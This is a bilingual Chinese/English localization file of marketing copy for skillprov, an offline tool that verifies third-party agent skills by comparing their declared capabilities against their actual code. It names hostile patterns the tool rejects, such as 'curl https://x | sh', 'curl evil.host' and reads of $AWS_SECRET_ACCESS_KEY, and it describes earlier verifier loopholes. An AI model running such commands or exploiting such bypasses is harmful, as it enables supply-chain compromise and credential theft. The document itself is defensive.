eyebrow.zh: 装之前先验签 · 声明比对实际代码 · 越权直接拒 · 全程离线
eyebrow.en: Verify before install · Manifest checked against real code · Over-reach rejected · Fully offline

headline.zh:
声明一套、实际做另一套——
装之前，让它先过一次能力验签
headline.en:
Declares one thing, does another —
make it pass a capability check before you install

sub.zh: 你从一个 skill 目录里 install 的第三方 skill，以完整的工具、网络与文件系统权限在你机器上跑起来——没有签名，也没人比对过它「声称能做什么」和「实际伸手做什么」。skillprov 在装之前先静态重扫这个 skill，把「声明能力」和「实际代码里观察到的能力」按值粒度做差集：偷偷 curl 远端、curl | sh 装器、读 $AWS_SECRET_ACCESS_KEY、把网络字段干脆省略想靠默认通过——任何一项越权都直接 REJECTED，带着文件行号退出码 1。一个 Go 单二进制，全程离线，无守护进程。
sub.en: The third-party skill you install from a directory runs with full tool, network, and filesystem permissions — unsigned, and nobody has compared what it claims to do against what it actually reaches for. skillprov statically re-scans the skill before install and diffs declared capabilities against the ones observed in the real code at value granularity: a hidden curl to a remote host, a curl | sh installer, a read of $AWS_SECRET_ACCESS_KEY, or a network field simply omitted to sneak through on a default — any one of them is REJECTED with file:line evidence and exit code 1. One Go binary, fully offline, no daemon.

title.zh: 省略网络字段，再也不能默认通过
title.en: An omitted network field no longer slips through

body.zh: 只要把清单里的 `network` 字段整个省略，旧版本会当成「声明了网络」——于是它 curl 任何主机都验签通过。v0.4 关掉了这个默认真漏洞：只有真写了主机白名单才算声明网络；省略 = 不许联网，一联网就红。一份能偷偷 curl、却把网络字段声明缺省的清单，本身就是要拦的东西。
body.en: Drop the `network` key from a manifest and the old verifier read it as 'declared network' — so the skill could curl any host and still pass. v0.4 closes that default-true loophole: network counts as declared only when a host allowlist is actually written; omitted means no network, and any net call turns red. A manifest that curls in secret while declaring nothing is exactly what this gate is for.

title.zh: 声明 git，却 curl | sh——被点名拒绝
title.en: Declares git, but pipes curl | sh — named and rejected

body.zh: 「声明了 commands: [git]」以前意味着可以偷偷 `curl https://x | sh` 还验签通过。v0.3 起 exec 命令也按值粒度做白名单：每一条观察到的外部命令都必须在声明清单里，残留的 `curl`、`sh` 会被逐个点名，连文件行号一起报红——供应链里最经典的 `curl | sh` 技巧就此失效。
body.en: Declaring `commands: [git]` used to mean a quiet `curl https://x | sh` still verified green. Since v0.3 the exec allowlist is diffed at value granularity: every observed external command must appear in the declared set, and any residual `curl` or `sh` is named individually with its file:line and rejected — the classic `curl | sh` supply-chain trick stops here.

title.zh: 声明 api.github.com——`curl evil.host` 也拦得住
title.en: Declare api.github.com — `curl evil.host` is blocked too

body.zh: 声明一个主机白名单，不再留「省掉 https:// 就绕过」的暗门——`curl evil.host`（不带协议头）curl 会当成 http 真去访问，这类无协议主机也被抓出来比对、越界即红。环境变量白名单同理，而 shell 自带的 `$_`（上一条命令的最后一个参数）不再被误判成偷读环境变量：诚实使用 `$_` 的 skill 不再被冤枉报红，越界的那个主机、那个变量才被点名。声明了什么，就只许什么。
body.en: Declaring a host allowlist leaves no 'drop the https:// and slip through' back door — `curl evil.host` (no scheme) is a real call curl treats as http, and such schemeless hosts are now captured and diffed, turning red the moment they're off the allowlist. The env-var allowlist works the same way, and the shell's own `$_` (the last argument of the previous command) is no longer misread as a sneaky env-var read: an honest skill using `$_` is no longer falsely rejected — only the off-allowlist host or variable gets named. What you declare is all that's allowed.

title.zh: 签名 + 内容锁，离线三十秒可审
title.en: Signature + content lock, offline and auditable in 30 seconds

body.zh: 每份 skill 配一份可签名的能力清单和一份它实际包含什么的 SBOM。签名用本地 ed25519 私钥，全程离线、无服务端。验签时先重算每个文件的 sha256 内容锁、再校验签名——清单在签名后被改过一个字节，下一次验签就失败。一个 Go 单二进制，不挂后台、不联网取价，三十秒就能审完它会不会回传数据。
body.en: Every skill ships with a signable capability manifest and an SBOM of what it actually contains. Signing uses a local ed25519 key, fully offline, no server. On verify it first recomputes every file's sha256 content lock, then checks the signature — a manifest altered by a single byte after signing fails the next verify. One Go binary, no background process, no network, auditable in thirty seconds.

headline.zh: 装之前，先给 skill 验一次签
headline.en: Verify a skill before you install it

sub.zh: 开源、Apache-2.0、无付费墙。给第三方 skill 加能力清单这件事，永不收费。
sub.en: Open source, Apache-2.0, no paywall. Giving a third-party skill a capability manifest is never gated.
